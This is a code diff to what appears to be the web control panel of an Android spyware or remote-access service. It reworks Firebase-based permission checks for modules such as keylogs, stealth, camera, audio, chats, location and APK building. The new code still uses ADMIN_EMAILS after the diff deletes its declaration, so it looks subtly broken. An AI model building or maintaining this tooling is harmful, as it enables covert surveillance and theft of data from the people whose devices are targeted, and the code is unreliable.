@@ -849,9 +849,25 @@
     </div>
 
     <script>
-    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
-    window.userPermissions = {};
-    window.isUserAdmin = false;
+    window.globalDefaults = {
+        sms: false,
+        notification: false,
+        stealth: false,
+        accounts: false,
+        calls: false,
+        gallery: false,
+        files: false,
+        location: false,
+        keylogs: false,
+        audio: false,
+        camera: false,
+        chats: false,
+        apps: false,
+        privacy_screen: false,
+        sensitive_feed: false,
+        edit_modules: false,
+        build_apk: true
+    };
 
     fbAuth.onAuthStateChanged(user => {
         if (!user) {
@@ -864,10 +880,27 @@
 
         trackUserActivity(user, `Opened Device Control [${DID}]`);
 
+        // Listen to Global Default Rules
+        fbDb.ref('global_config/default_permissions').on('value', gSnap => {
+            if (gSnap.exists()) {
+                window.globalDefaults = Object.assign({}, window.globalDefaults, gSnap.val());
+            }
+            evaluatePermissions();
+        });
+
+        // Listen to User-Specific Overrides
+        let currentMeta = {};
         fbDb.ref('users_meta/' + uid).on('value', snap => {
-            const meta = snap.val() || {};
-            window.userPermissions = meta.permissions || {};
-            window.isUserAdmin = ADMIN_EMAILS.includes(email) || meta.role === 'ADMIN';
+            currentMeta = snap.val() || {};
+            evaluatePermissions();
+        });
+
+        function evaluatePermissions() {
+            const userCustom = currentMeta.permissions || {};
+            window.isUserAdmin = ADMIN_EMAILS.includes(email) || currentMeta.role === 'ADMIN';
+
+            // Merge global defaults with user overrides
+            window.userPermissions = Object.assign({}, window.globalDefaults, userCustom);
             
             const badge = document.getElementById('privacyLockBadge');
             if (badge) {
@@ -877,7 +910,7 @@
             if (typeof updateTabLockUI === 'function') {
                 updateTabLockUI();
             }
-        });
+        }
 
         document.getElementById('authLoader').style.display = 'none';
     });
